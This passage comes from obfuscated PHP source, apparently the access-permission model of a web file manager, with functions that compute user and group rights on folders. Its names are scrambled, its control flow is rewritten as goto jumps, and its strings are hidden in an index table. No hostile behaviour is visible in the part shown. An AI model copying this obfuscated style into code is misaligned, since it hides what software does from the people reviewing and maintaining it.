array($Eœ’õ×‘®)); $d½º­ìÉŒ˜[$C“‡­†ßô›[$BĞˆˆø•Ÿõ[390]]] = $C“‡­†ßô›; } } $aÁÅóÎ Ç = array(); $E¾ Ÿäë± = $this->getAllChildren($E„ä‚˜); goto d‡ñ’ã£“ì; CÁÖÒùÖŒ‘: $BĞˆˆø•Ÿõ =& $_SERVER[¹…ÕÄ]; $E¾ŠÎœÅÒ = Model($BĞˆˆø•Ÿõ[501])->getInfo($dĞåã‘×´); if (!$dĞåã‘×´ || !$E„ä‚˜ || !$E¾ŠÎœÅÒ) { return array(); } goto b‰Î¥‚Œœé; b‰Î¥‚Œœé: $bø«‹œù­» = Model($BĞˆˆø•Ÿõ[1183])->sourceInfo($E„ä‚˜); $d½º­ìÉŒ˜ = array(); $B°æâº·ª¼ = 1; goto A”Œí—£»; D©èŠÎØÄ: } public function setAllChildrenByUser($cõ“ßé“í¤, $DÌ È¯’¨Ë, $F‘…ƒµÃ¬³) { $bŒÚ¤ŒÇó =& $_SERVER[¹…ÕÄ]; $F´‚†©˜ = $this->getAllChildrenByUser($cõ“ßé“í¤, $DÌ È¯’¨Ë); if (!$F‘…ƒµÃ¬³ || !$F´‚†©˜) { return !1; } foreach ($F´‚†©˜ as $fäòÛÆøÀ£) { $b£÷ŞŒæ’ = array(); foreach ($fäòÛÆøÀ£[$bŒÚ¤ŒÇó[1839]] as $Aä‚‚»Ä£) { $BÑÆÌ­ïï = $Aä‚‚»Ä£[$bŒÚ¤ŒÇó[440]]; $FÕ¨»´½Ê = $Aä‚‚»Ä£[$bŒÚ¤ŒÇó[1504]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $e²šõÌ‡é = $Aä‚‚»Ä£[$bŒÚ¤ŒÇó[1504]] ? $Aä‚‚»Ä£[$bŒÚ¤ŒÇó[1504]] : $Aä‚‚»Ä£[$bŒÚ¤ŒÇó[1667]]; if ($Aä‚‚»Ä£[$bŒÚ¤ŒÇó[1504]] && $Aä‚‚»Ä£[$bŒÚ¤ŒÇó[1504]] == $DÌ È¯’¨Ë) { continue; } $b£÷ŞŒæ’[] = array($bŒÚ¤ŒÇó[390] => $fäòÛÆøÀ£[$bŒÚ¤ŒÇó[390]], $bŒÚ¤ŒÇó[398] => $FÕ¨»´½Ê, $bŒÚ¤ŒÇó[478] => intval($e²šõÌ‡é), $bŒÚ¤ŒÇó[1763] => isset($BÑÆÌ­ïï[$bŒÚ¤ŒÇó[388]]) ? intval($BÑÆÌ­ïï[$bŒÚ¤ŒÇó[388]]) : 0, $bŒÚ¤ŒÇó[1817] => isset($BÑÆÌ­ïï[$bŒÚ¤ŒÇó[1817]]) ? intval($BÑÆÌ­ïï[$bŒÚ¤ŒÇó[1817]]) : -1); } $b£÷ŞŒæ’[] = array($bŒÚ¤ŒÇó[390] => $fäòÛÆøÀ£[$bŒÚ¤ŒÇó[390]], $bŒÚ¤ŒÇó[398] => SourceModel::TYPE_USER, $bŒÚ¤ŒÇó[478] => intval($DÌ È¯’¨Ë), $bŒÚ¤ŒÇó[1763] => intval($F‘…ƒµÃ¬³), $bŒÚ¤ŒÇó[1817] => -1); $this->where(array($bŒÚ¤ŒÇó[404] => $fäòÛÆøÀ£[$bŒÚ¤ŒÇó[390]]))->delete(); $this->addAll($b£÷ŞŒæ’); } return !0; } public function get($f¶Ù¸¡¼ò) { $f¨¡áİí¹İ = $this->getSourceList(array($f¶Ù¸¡¼ò), !0); return $f¨¡áİí¹İ[0]; } public function getSourceList($E»ÈØ²Â”, $CùÙŒÂå = false, $AÄ¢£†— = false) { goto E£ùã¬ÆÀã; eà¶Ó ì­³: if (!$CùÙŒÂå && count($E»ÈØ²Â”) == 1) { $CùÙŒÂå = array(); $CùÙŒÂå[$E»ÈØ²Â”[0]] = $A¼Ü™ßÓï->sourceInfo($E»ÈØ²Â”[0]); } if (!$CùÙŒÂå) { $b®æŞ‡Œâ = array($dòÕªˆÓ·[404] => array($dòÕªˆÓ·[405], $E»ÈØ²Â”)); $CùÙŒÂå = $A¼Ü™ßÓï->field($dòÕªˆÓ·[1843])->where($b®æŞ‡Œâ)->select(); $CùÙŒÂå = array_to_keyvalue($CùÙŒÂå, $dòÕªˆÓ·[390]); } $AØ·ŞØ“à = $E»ÈØ²Â”; goto f‹ñİ¬‚¬ƒ; E£ùã¬ÆÀã: $dòÕªˆÓ· =& $_SERVER[¹…ÕÄ]; if (!$E»ÈØ²Â”) { return array(); } $A¼Ü™ßÓï = Model($dòÕªˆÓ·[1183]); goto eà¶Ó ì­³; f‹ñİ¬‚¬ƒ: foreach ($CùÙŒÂå as $D‰½ç‹Î => $Fäù²‡Œâ®) { $e ×†·Ï» = $A¼Ü™ßÓï->parentLevelArray($Fäù²‡Œâ®[$dòÕªˆÓ·[481]]); $AØ·ŞØ“à = array_merge($AØ·ŞØ“à, array($D‰½ç‹Î), array_reverse($e ×†·Ï»)); } $AØ·ŞØ“à = array_values(array_unique($AØ·ŞØ“à)); if (!$AØ·ŞØ“à) { return array(); } goto aÁ¶Ò± ¾’; f•¸ºŞÓ‹: $aÍ¾é¹õêÖ = $this->userIsRoot($AÄ¢£†—); $FÇ¤õ…££Š = AuthModel::authAll(); $cî½ÍàãÖ = array($dòÕªˆÓ·[401] => $FÇ¤õ…££Š, $dòÕªˆÓ·[1844] => array($dòÕªˆÓ·[406] => 0, $dòÕªˆÓ·[1673] => $FÇ¤õ…££Š, $dòÕªˆÓ·[407] => LNG($dòÕªˆÓ·[1845]), $dòÕªˆÓ·[1688] => $dòÕªˆÓ·[1846])); goto f«º¼‘¸§ã; f«º¼‘¸§ã: $CÁ‚Ìš ë® = array(); foreach ($CùÙŒÂå as $bƒù®êá› => $dŠÛ›ö©¿Š) { if ($aÍ¾é¹õêÖ) { $CÁ‚Ìš ë®[$bƒù®êá›] = $cî½ÍàãÖ; continue; } $CÁ‚Ìš ë®[$bƒù®êá›] = $this->makeSourceAuth($dŠÛ›ö©¿Š, $bÇ‹…Öù, $AÄ¢£†—); } return $CÁ‚Ìš ë®; goto aì©çğÆ“õ; aÁ¶Ò± ¾’: $a¼Õ—ËŸŠ = $this->sourceAuthSelect($AØ·ŞØ“à); $bÇ‹…Öù = array(); foreach ($AØ·ŞØ“à as $bƒù®êá›) { if (isset($a¼Õ—ËŸŠ[$bƒù®êá›])) { $bÇ‹…Öù[$bƒù®êá›] = $a¼Õ—ËŸŠ[$bƒù®êá›]; } } goto f•¸ºŞÓ‹; aì©çğÆ“õ: } public function authDeepCheck($D¨„¦÷³œˆ, $EĞ¿†íõ¸ = false) { goto A‰‚ğŠ’Á„; EÎ½§ÙÁ­: if (!$A‹öèŠÈõ…) { return !1; } $b˜¸Ô´öŠ¸ = $A‹öèŠÈõ… ? $A‹öèŠÈõ…[0] : $D¨„¦÷³œˆ; return array($B’ù—‘ÉĞë[401] => -1, $B’ù—‘ÉĞë[440] => array($B’ù—‘ÉĞë[406] => $B’ù—‘ÉĞë[1063], $B’ù—‘ÉĞë[1673] => $B’ù—‘ÉĞë[491], $B’ù—‘ÉĞë[407] => LNG($B’ù—‘ÉĞë[1849]), $B’ù—‘ÉĞë[1688] => $B’ù—‘ÉĞë[1850]), $B’ù—‘ÉĞë[1851] => LNG($B’ù—‘ÉĞë[1852]), $B’ù—‘ÉĞë[1853] => $this->sourceAuthInfo($b˜¸Ô´öŠ¸)); goto c’ßøÚ˜¢ï; A‰‚ğŠ’Á„: $B’ù—‘ÉĞë =& $_SERVER[¹…ÕÄ]; $EĞ¿†íõ¸ = $EĞ¿†íõ¸ ? $EĞ¿†íõ¸ : USER_ID; $Cç×õöÀ› = $this->makeAuthDeep($EĞ¿†íõ¸); goto EÛ ÂéÅ; EÛ ÂéÅ: if (!in_array($D¨„¦÷³œˆ, $Cç×õöÀ›[$B’ù—‘ÉĞë[1847]])) { return !1; } $A‹öèŠÈõ… = array(); foreach ($Cç×õöÀ›[$B’ù—‘ÉĞë[1848]] as $b±ØÊÎÑ => $D Œ™‘œ) { if (!in_array($D¨„¦÷³œˆ, $D Œ™‘œ)) { continue; } $A‹öèŠÈõ…[] = $b±ØÊÎÑ; } goto EÎ½§ÙÁ­; c’ßøÚ˜¢ï: } protected function makeAuthDeep($BîË›±ïæª = false) { goto e…—¢Æöí¸; eòï“Ÿ¡»ã: if (isset($cêÍ¤ÃÕİã[$BîË›±ïæª])) { return $cêÍ¤ÃÕİã[$BîË›±ïæª]; } $dŒ³ã˜ç‡ = Model($eëŠ‹À†¸[1854])->listData(); $eÛÙÀÆïç» = array(); goto AÜÀÃ­“Ø–; dàõã˜§œ: $DñÃ¨…óñŸ = $E˜…–«è±ã; $dËŒôøóâ½ = Model($eëŠ‹À†¸[1183]); $Bßµ¤¶Æ = Model($eëŠ‹À†¸[480]); goto D„ÓÄ‰²’ß; B„çç¢“İ: $BÌ×¤ò¶’î = $DñÃ¨…óñŸ; foreach ($BÌ×¤ò¶’î as $dõÕ÷óõ¤) { $EÇ„¡á¡«Õ = $Bßµ¤¶Æ->getInfo($dõÕ÷óõ¤); $e­š¯¾µîÓ = $dËŒôøóâ½->parentLevelArray($EÇ„¡á¡«Õ[$eëŠ‹À†¸[481]]); $DñÃ¨…óñŸ = array_merge($DñÃ¨…óñŸ, $e­š¯¾µîÓ); } $DñÃ¨…óñŸ = array_values(array_unique($DñÃ¨…óñŸ)); goto c‰‹º·Ö»³; e’à÷ßİï: $D¹Š‘ñÕ©ê = array($eëŠ‹À†¸[1847] => $CĞ¼´Ì–, $eëŠ‹À†¸[1848] => $F¯ğä²õ²œ); $cêÍ¤ÃÕİã[$BîË›±ïæª] = $D¹Š‘ñÕ©ê; return $D¹Š‘ñÕ©ê; goto C¶§è‘™Üê; e…—¢Æöí¸: $eëŠ‹À†¸ =& $_SERVER[¹…ÕÄ]; static $cêÍ¤ÃÕİã = array(); $BîË›±ïæª = $BîË›±ïæª ? $BîË›±ïæª : USER_ID; goto eòï“Ÿ¡»ã; e³à®¾«½: $FëŞœí‚åŸ = array(); if ($d³Ô‹–•Úº) { $AÆ×áëµÑ = $dËŒôøóâ½->where(array($eëŠ‹À†¸[390] => array($eëŠ‹À†¸[405], $d³Ô‹–•Úº)))->select(); foreach ($AÆ×áëµÑ as $CÊß“ªß) { $e­š¯¾µîÓ = $dËŒôøóâ½->parentLevelArray($CÊß“ªß[$eëŠ‹À†¸[481]]); $CĞ¼´Ì– = array_merge($CĞ¼´Ì–, $e­š¯¾µîÓ); $DñÃ¨…óñŸ[] = $CÊß“ªß[$eëŠ‹À†¸[478]]; $F¯ğä²õ²œ[$CÊß“ªß[$eëŠ‹À†¸[390]]] = $e­š¯¾µîÓ; $Aá‚Å¾Ë…¿[$CÊß“ªß[$eëŠ‹À†¸[390]]] = $CÊß“ªß[$eëŠ‹À†¸[478]]; } } $DñÃ¨…óñŸ = array_values(array_unique($DñÃ¨…óñŸ)); goto B„çç¢“İ; aÃº¢ù‹Ø®: if ($E˜…–«è±ã) { $f ´â‹åòé = array(array($eëŠ‹À†¸[398] => SourceModel::TYPE_USER, $eëŠ‹À†¸[478] => $BîË›±ïæª), array($eëŠ‹À†¸[398] => SourceModel::TYPE_GROUP, $eëŠ‹À†¸[478] => array($eëŠ‹À†¸[405], $E˜…–«è±ã)), $eëŠ‹À†¸[936] => $eëŠ‹À†¸[1755]); } $DÆÆõƒ† = $this->field($eëŠ‹À†¸[1855])->where($f ´â‹åòé)->select(); $d³Ô‹–•Úº = array(); goto F›¬Ç„ĞË; F›¬Ç„ĞË: $dİ£ÁñÓğ = array_to_keyvalue_group($DÆÆõƒ†, $eëŠ‹À†¸[390]); foreach ($dİ£ÁñÓğ as $AŒÉ†‘­¸‰ => $F¯‡¥“î¼Ü) { $eá¬òÛ£¦ = $this->authArrayCheck($F¯‡¥“î¼Ü, $BîË›±ïæª); if ($eá¬òÛ£¦[$eëŠ‹À†¸[401]] > 0) { $d³Ô‹–•Úº[] = $AŒÉ†‘­¸‰ . $eëŠ‹À†¸[33]; } } $CĞ¼´Ì– = array(); goto dàõã˜§œ; D„ÓÄ‰²’ß: $F¯ğä²õ²œ = array(); $Aá‚Å¾Ë…¿ = array(); $E§Æ¥èŠ’Ô = array(); goto e³à®¾«½; c‰‹º·Ö»³: foreach ($DñÃ¨…óñŸ as $dõÕ÷óõ¤) { $EÇ„¡á¡«Õ = $Bßµ¤¶Æ->getInfo($dõÕ÷óõ¤); $CĞ¼´Ì–[] = $EÇ„¡á¡«Õ[$eëŠ‹À†¸[84]][$eëŠ‹À†¸[390]]; $E§Æ¥èŠ’Ô[$dõÕ÷óõ¤] = $EÇ„¡á¡«Õ[$eëŠ‹À†¸[84]][$eëŠ‹À†¸[390]]; $FëŞœí‚åŸ[$dõÕ÷óõ¤] = $dËŒôøóâ½->parentLevelArray($EÇ„¡á¡«Õ[$eëŠ‹À†¸[481]]); } foreach ($F¯ğä²õ²œ as $D¢Û¸»¯„Š => $EÏ”„©Öæ‰) { $FÜÚ‹Ÿ¹‡ = $Aá‚Å¾Ë…¿[$D¢Û¸»¯„Š]; if (!$FÜÚ‹Ÿ¹‡ || !$E§Æ¥èŠ’Ô[$FÜÚ‹Ÿ¹‡]) { continue; } $FÊ­¨÷øë„ = array(); foreach ($FëŞœí‚åŸ[$FÜÚ‹Ÿ¹‡] as $dõÕ÷óõ¤) { $FÊ­¨÷øë„[] = $E§Æ¥èŠ’Ô[$dõÕ÷óõ¤]; } $F¯ğä²õ²œ[$D¢Û¸»¯„Š] = array_merge($FÊ­¨÷øë„, $EÏ”„©Öæ‰); } $CĞ¼´Ì– = array_values(array_unique($CĞ¼´Ì–)); goto e’à÷ßİï; AÜÀÃ­“Ø–: foreach ($dŒ³ã˜ç‡ as $c¥•é‚ó¤õ) { if ($c¥•é‚ó¤õ[$eëŠ‹À†¸[400]] == 0 && $c¥•é‚ó¤õ[$eëŠ‹À†¸[1689]] == $eëŠ‹À†¸[86]) { $eÛÙÀÆïç»[] = $c¥•é‚ó¤õ[$eëŠ‹À†¸[388]]; } } $E˜…–«è±ã = $this->userGroupParents($BîË›±ïæª); $f ´â‹åòé = array($eëŠ‹À†¸[398] => SourceModel::TYPE_USER, $eëŠ‹À†¸[478] => $BîË›±ïæª); goto aÃº¢ù‹Ø®; C¶§è‘™Üê: } private function makeSourceAuth($BÉÆ½‡­†õ, $dŸöº—Á«§, $BàˆŒƒ‡—± = false) { goto eòÊ§Ö Ëé; cÕƒùÇ›¤‘: $B„­ÉÂËÆô = Model($c…†­£ìøğ[1183])->parentLevelArray($BÉÆ½‡­†õ[$c…†­£ìøğ[481]]); $B„­ÉÂËÆô = array_merge(array($BÉÆ½‡­†õ[$c…†­£ìøğ[390]]), array_reverse($B„­ÉÂËÆô)); $bÊñ¦óï”» = !1; goto bà†êÄÒÊÏ; bà†êÄÒÊÏ: foreach ($B„­ÉÂËÆô as $dÉ³È”áµË) { if (!isset($dŸöº—Á«§[$dÉ³È”áµË])) { continue; } $f¸µªï™À = $this->authMake($dŸöº—Á«§[$dÉ³È”áµË], $BàˆŒƒ‡—±); if ($f¸µªï™À[$c…†­£ìøğ[440]]) { $bÊñ¦óï”» = $f¸µªï™À; break; } } if (!$d’Õ¤ÁÑ±) { return $bÊñ¦óï”»; } if (!$bÊñ¦óï”» && $F¥ïº£¶¸¼) { $bÊñ¦óï”» = $this->groupAuthInfo($F¥ïº£¶¸¼, $c·á¿âô™Ë); } goto Fëâµê­£¸; FƒĞ–ÀÖëå: $d’Õ¤ÁÑ± = $BÉÆ½‡­†õ[$c…†­£ìøğ[398]] == SourceModel::TYPE_GROUP; $F¥ïº£¶¸¼ = $d’Õ¤ÁÑ± ? $this->groupRootAuth($c·á¿âô™Ë, $BàˆŒƒ‡—±) : !1; if ($F¥ïº£¶¸¼ && Model($c…†­£ìøğ[1835])->authCheckAction($F¥ïº£¶¸¼[$c…†­£ìøğ[400]], $c…†­£ìøğ[1687])) { return $this->groupAuthInfo($F¥ïº£¶¸¼, $c·á¿âô™Ë); } goto cÕƒùÇ›¤‘; eòÊ§Ö Ëé: $c…†­£ìøğ =& $_SERVER[¹…ÕÄ]; $CÃŒ†ÏäñŠ = $c…†­£ìøğ[86]; $c·á¿âô™Ë = $BÉÆ½‡­†õ[$c…†­£ìøğ[478]]; goto FƒĞ–ÀÖëå; Fëâµê­£¸: if (!$bÊñ¦óï”») { $a¸÷è…¢Œï = Model($c…†­£ìøğ[480])->getInfo($c·á¿âô™Ë); $A²ˆ¯Ù†äì = explode($c…†­£ìøğ[47], trim($a¸÷è…¢Œï[$c…†­£ìøğ[481]], $c…†­£ìøğ[47])); $A²ˆ¯Ù†äì = array_reverse($A²ˆ¯Ù†äì); foreach ($A²ˆ¯Ù†äì as $f…æÊ¥„Úæ) { if ($f…æÊ¥„Úæ == $c…†­£ìøğ[491] || $f…æÊ¥„Úæ == $CÃŒ†ÏäñŠ) { continue; } $BË¢©æ„† = $this->groupRootAuth($f…æÊ¥„Úæ, $BàˆŒƒ‡—±); if (!$BË¢©æ„†) { continue; } $bÊñ¦óï”» = $this->groupAuthInfo($BË¢©æ„†, $f…æÊ¥„Úæ); break; } } if (!$bÊñ¦óï”» || $bÊñ¦óï”»[$c…†­£ìøğ[401]] <= 0) { $C§Ù¿İö°½ = $this->authDeepCheck($BÉÆ½‡­†õ[$c…†­£ìøğ[390]], $BàˆŒƒ‡—±); if ($C§Ù¿İö°½) { $bÊñ¦óï”» = $C§Ù¿İö°½; } } return $bÊñ¦óï”»; goto f‰º±ÒÑğ‘; f‰º±ÒÑğ‘: } private function userIsRoot($dø‘ßóïò = false) { $D„¾ĞÔª×Ù =& $_SERVER[¹…ÕÄ]; if (!$dø‘ßóïò && _get($GLOBALS, $D„¾ĞÔª×Ù[479])) { return !0; } $EŞÁßê¶†ø = Model($D„¾ĞÔª×Ù[501])->getInfo($dø‘ßóïò); $aÖÍ§¡µ = Model($D„¾ĞÔª×Ù[1856])->listData($EŞÁßê¶†ø[$D„¾ĞÔª×Ù[1388]]); if ($aÖÍ§¡µ && $aÖÍ§¡µ[$D„¾ĞÔª×Ù[1259]][$D„¾ĞÔª×Ù[1857]] == 1) { return !0; } return !1; } private function sourceAuthInfo($fŞ¤ãª‚¨õ) { goto aÚ•À„§ğŸ; f»ØòŞ½ãÙ: if (!$bÚõ ŞËôß) { return !1; } $c“ÏÁæÈ¨£->groupPathDisplay($bÚõ ŞËôß); $f‡öäò³Ç = array($bÚõ ŞËôß); goto E…óÛÅ†ó´; aÈ‡‘¼«£®: if (isset($bÚõ ŞËôß[$C„ºÇ¯ÒÌ»[486]])) { $FÎ”ß²ÎÕ = explode($C„ºÇ¯ÒÌ»[8], trim($bÚõ ŞËôß[$C„ºÇ¯ÒÌ»[489]], $C„ºÇ¯ÒÌ»[8])); array_shift($FÎ”ß²ÎÕ); $A‰Å‘“°‚× = $bÚõ ŞËôß[$C„ºÇ¯ÒÌ»[484]] . $C„ºÇ¯ÒÌ»[1858] . implode($C„ºÇ¯ÒÌ»[8], $FÎ”ß²ÎÕ); } return array($C„ºÇ¯ÒÌ»[407] => $bÚõ ŞËôß[$C„ºÇ¯ÒÌ»[28]], $C„ºÇ¯ÒÌ»[75] => KodIO::make($bÚõ ŞËôß[$C„ºÇ¯ÒÌ»[390]]), $C„ºÇ¯ÒÌ»[1859] => $A‰Å‘“°‚×); goto C¦ï¹’ì„; E…óÛÅ†ó´: $f‡öäò³Ç = $c“ÏÁæÈ¨£->_listAppendPath($f‡öäò³Ç); $bÚõ ŞËôß = $f‡öäò³Ç[0]; $A‰Å‘“°‚× = $bÚõ ŞËôß[$C„ºÇ¯ÒÌ»[489]]; goto aÈ‡‘¼«£®; aÚ•À„§ğŸ: $C„ºÇ¯ÒÌ» =& $_SERVER[¹…ÕÄ]; $c“ÏÁæÈ¨£ = Model($C„ºÇ¯ÒÌ»[1183]); $bÚõ ŞËôß = $c“ÏÁæÈ¨£->sourceInfo($fŞ¤ãª‚¨õ); goto f»ØòŞ½ãÙ; C¦ï¹’ì„: } private function groupAuthInfo($Dà¯å¼ÈŒ, $bô¬Î›Œô) { $AîšäÚÁ­ =& $_SERVER[¹…ÕÄ]; $FÌ¡„ÑÙº = Model($AîšäÚÁ­[480])->getInfo($bô¬Î›Œô); return array($AîšäÚÁ­[1860] => intval($Dà¯å¼ÈŒ[$AîšäÚÁ­[400]]), $AîšäÚÁ­[1844] => $Dà¯å¼ÈŒ, $AîšäÚÁ­[1861] => LNG($AîšäÚÁ­[1862]), $AîšäÚÁ­[1853] => array($AîšäÚÁ­[407] => $FÌ¡„ÑÙº[$AîšäÚÁ­[28]], $AîšäÚÁ­[75] => KodIO::make($FÌ¡„ÑÙº[$AîšäÚÁ­[84]][$AîšäÚÁ­[390]]), $AîšäÚÁ­[1859] => $FÌ¡„ÑÙº[$AîšäÚÁ­[485]])); } protected function groupRootAuth($Aƒ¤õ·Æ, $EáäâÜóÑï = false) { goto CÜ‡³Äæ•¦; BùÑ­áöÌ¢: $E¢İø‡¡ÆË = $this->userGroupList($EáäâÜóÑï); $bÁÊ­Ü•‡« = isset($E¢İø‡¡ÆË[$Aƒ¤õ·Æ]) ? $E¢İø‡¡ÆË[$Aƒ¤õ·Æ][$BÜ¿šÓ‡İ[400]] : !1; if ($bÁÊ­Ü•‡« && Model($BÜ¿šÓ‡İ[1835])->authCheckAction($bÁÊ­Ü•‡«[$BÜ¿šÓ‡İ[400]], $BÜ¿šÓ‡İ[1687])) { $Fˆ×ÛÁª³[$fÚ£êôä×İ] = $bÁÊ­Ü•‡«; return $bÁÊ­Ü•‡«; } goto C´Ú­«Á±; DÌªí¿ß÷‹: $Fˆ×ÛÁª³[$fÚ£êôä×İ] = $bÆ‹ãòÚ ? $bÆ‹ãòÚ : $bÁÊ­Ü•‡«; return $Fˆ×ÛÁª³[$fÚ£êôä×İ]; goto B÷Ä‚—ÎôÏ; CÜ‡³Äæ•¦: $BÜ¿šÓ‡İ =& $_SERVER[¹…ÕÄ]; $EáäâÜóÑï = $EáäâÜóÑï ? $EáäâÜóÑï : USER_ID; $fÚ£êôä×İ = $EáäâÜóÑï . $BÜ¿šÓ‡İ[1863] . $Aƒ¤õ·Æ; goto b¼ä–‰øŞ; b¼ä–‰øŞ: static $Fˆ×ÛÁª³ = array(); if (isset($Fˆ×ÛÁª³[$fÚ£êôä×İ])) { return $Fˆ×ÛÁª³[$fÚ£êôä×İ]; } $EŸù£˜Š„ğ = Model($BÜ¿šÓ‡İ[480])->getInfo($Aƒ¤õ·Æ); goto BùÑ­áöÌ¢; C´Ú­«Á±: $c®Ö²˜ÙŞ = $this->sourceAuthSelect($EŸù£˜Š„ğ[$BÜ¿šÓ‡İ[84]][$BÜ¿šÓ‡İ[390]]); $eÀÓ¯ì­­ = $c®Ö²˜ÙŞ ? $this->authMake($c®Ö²˜ÙŞ, $EáäâÜóÑï) : !1; $bÆ‹ãòÚ = $eÀÓ¯ì­­ ? $eÀÓ¯ì­­[$BÜ¿šÓ‡İ[440]] : !1; goto DÌªí¿ß÷‹; B÷Ä‚—ÎôÏ: } public function authOwnerApply($e®¨ğÏ¤ù) { goto d²Ã¼š”Î¯; c­Áö§ô: $E‹˜ÃñÓ“ó = Model($eåäÜ÷øÏÑ[1183])->parentLevelArray($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[481]]); $E‹˜ÃñÓ“ó = array_merge(array($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[390]]), array_reverse($E‹˜ÃñÓ“ó)); $C‰˜ÅÖ§‚ = $this->sourceAuthSelect($E‹˜ÃñÓ“ó); goto AÚ®’ëãÇ; d²Ã¼š”Î¯: $eåäÜ÷øÏÑ =& $_SERVER[¹…ÕÄ]; if (empty($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[400]]) || isset($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[1864]]) && $e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[1864]]) { return $e®¨ğÏ¤ù; } if (AuthModel::authCheckRoot($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[400]][$eåäÜ÷øÏÑ[401]])) { return $e®¨ğÏ¤ù; } goto c­Áö§ô; f®ãÇ Â‚: $e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[400]][$eåäÜ÷øÏÑ[1866]] = Model($eåäÜ÷øÏÑ[497])->userListInfo($fº»À½¸—‘); return $e®¨ğÏ¤ù; goto B©æÒõÙê¨; AÚ®’ëãÇ: $b—¥—®ŠÏĞ = array(); $fº»À½¸—‘ = array(); foreach ($C‰˜ÅÖ§‚ as $CŸÄâì°•Š => $bæíˆ–Ê¬) { $dšÏè×Œ’È = $this->authFolderOwnerUser($bæíˆ–Ê¬); $b—¥—®ŠÏĞ[$CŸÄâì°•Š] = $dšÏè×Œ’È; $fº»À½¸—‘ = array_merge($fº»À½¸—‘, $dšÏè×Œ’È[$eåäÜ÷øÏÑ[557]]); if ($dšÏè×Œ’È[$eåäÜ÷øÏÑ[1865]]) { break; } } goto e´ñ«£Şì; e´ñ«£Şì: if (count($fº»À½¸—‘) == 0) { $fº»À½¸—‘ = $this->authFolderOwnerGroup($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[478]]); } $fº»À½¸—‘ = array_unique($fº»À½¸—‘); if (AuthModel::authCheckRoot($e®¨ğÏ¤ù[$eåäÜ÷øÏÑ[400]][$eåäÜ÷øÏÑ[401]])) { $fº»À½¸—‘[] = USER_ID; } goto f®ãÇ Â‚; B©æÒõÙê¨: } private function authFolderOwnerGroup($F‰±—äøô) { $aöíƒğ±¡ =& $_SERVER[¹…ÕÄ]; $EÚ´™ùğô¸ = Model($aöíƒğ±¡[1749])->where(array($aöíƒğ±¡[1667] => $F‰±—äøô))->select(); $FØçÈïùµÛ = array(); if (!$EÚ´™ùğô¸) { return $FØçÈïùµÛ; } foreach ($EÚ´™ùğô¸ as $fÉÇÂ¬­—) { $CÍˆ„†àˆ = $this->authInfo($fÉÇÂ¬­—); if (AuthModel::authCheckRoot($CÍˆ„†àˆ[$aöíƒğ±¡[400]])) { $FØçÈïùµÛ[] = $fÉÇÂ¬­—[$aöíƒğ±¡[1504]]; } } return $FØçÈïùµÛ; } private function authFolderOwnerUser($D÷œÈ¨‹¶œ) { $BÆöºØ‰ˆ =& $_SERVER[¹…ÕÄ]; $DÖÓ©Õ‘ê„ = array(); $bÓŒäøÅ¦£ = !1; foreach ($D÷œÈ¨‹¶œ as $d¤´†«ƒï) { $CÉç¥ÕÚÇŠ = $this->authInfo($d¤´†«ƒï); if ($d¤´†«ƒï[$BÆöºØ‰ˆ[478]] == $BÆöºØ‰ˆ[491]) { $bÓŒäøÅ¦£ = !0; } if ($d¤´†«ƒï[$BÆöºØ‰ˆ[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($CÉç¥ÕÚÇŠ[$BÆöºØ‰ˆ[400]])) { $DÖÓ©Õ‘ê„[] = $d¤´†«ƒï[$BÆöºØ‰ˆ[478]]; } } } return array($BÆöºØ‰ˆ[557] => $DÖÓ©Õ‘ê„, $BÆöºØ‰ˆ[1865] => $bÓŒäøÅ¦£); } public function authMake($aßÉÕ¼ß, $fºÒô §‡° = false) { $A‹’Ñ²Ã²‰ =& $_SERVER[¹…ÕÄ]; $DÈ¾áÉÔØæ = $this->authArrayCheck($aßÉÕ¼ß, $fºÒô §‡°); if ($DÈ¾áÉÔØæ[$A‹’Ñ²Ã²‰[1867]]) { $DÈ¾áÉÔØæ[$A‹’Ñ²Ã²‰[1867]] = $this->sourceAuthInfo($DÈ¾áÉÔØæ[$A‹’Ñ²Ã²‰[1867]]); } return $DÈ¾áÉÔØæ; } public function authArrayCheck($EéŸÉõ·¡ˆ, $dÅöš¬Ğ•« = false) { goto dÇ¾Ìºèò’; C‚É¡Á²ï¥: return $DÏ²òÖ·Šå; goto D‡ÏŠ´†Ÿ¸; Aó¼ÃŠö«: $C®‡¯ä‡öš = 0; $Aà¸Ñ³Š²† = 0; $D¤–’˜ŠÉ = 0; goto eêÑ£ßºÍ; dÇ¾Ìºèò’: $bÔšÏà– =& $_SERVER[¹…ÕÄ]; if (!$EéŸÉõ·¡ˆ) { return array($bÔšÏà–[401] => 0, $bÔšÏà–[440] => !1); } $dÅöš¬Ğ•« = $dÅöš¬Ğ•« ? $dÅöš¬Ğ•« : USER_ID; goto b‹äœ†‘×; c ¼ù¹­Ğ: $f°Ï£Ğœš¹ = 0; $CëÆŞ£ºÃ  = 0; $F„ù“ìë¨· = array($bÔšÏà–[390] => 0); goto AÊõÄÕ¸™ò; eêÑ£ßºÍ: $fï¨¬ˆŒëÍ = 1000; $BÌ¨›ŞÚ½² = 0; $cÓ¹šŞ´«Ö = 0; goto c ¼ù¹­Ğ; b‹äœ†‘×: $AÂêœÊß¬± = 0; $C›Ç÷¹°‰ = 0; $D±ÁêëÅÈ¹ = 0; goto Aó¼ÃŠö«; AÊõÄÕ¸™ò: foreach ($EéŸÉõ·¡ˆ as $F„ù“ìë¨·) { $d§È†º‘ï = $this->authInfo($F„ù“ìë¨·); if (!$d§È†º‘ï) { continue; } $EÉš¢Í˜’Ò = $F„ù“ìë¨·[$bÔšÏà–[478]]; $AË‹±²ò” = intval($d§È†º‘ï[$bÔšÏà–[400]]); if ($F„ù“ìë¨·[$bÔšÏà–[398]] == SourceModel::TYPE_USER && $EÉš¢Í˜’Ò == $dÅöš¬Ğ•«) { $AÂêœÊß¬± = !0; $D±ÁêëÅÈ¹ = $d§È†º‘ï; $C›Ç÷¹°‰ = $AË‹±²ò”; } else { if ($F„ù“ìë¨·[$bÔšÏà–[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($EÉš¢Í˜’Ò, 